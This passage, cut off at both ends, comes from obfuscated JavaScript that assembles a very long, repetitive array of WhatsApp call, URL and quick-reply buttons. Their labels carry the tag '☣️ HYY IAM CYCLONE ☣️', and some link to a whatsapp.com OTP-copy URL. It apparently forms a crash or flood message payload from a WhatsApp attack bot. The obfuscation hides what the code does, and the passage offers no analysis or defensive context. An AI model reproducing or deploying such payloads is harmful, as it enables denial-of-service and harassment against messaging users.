isplayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton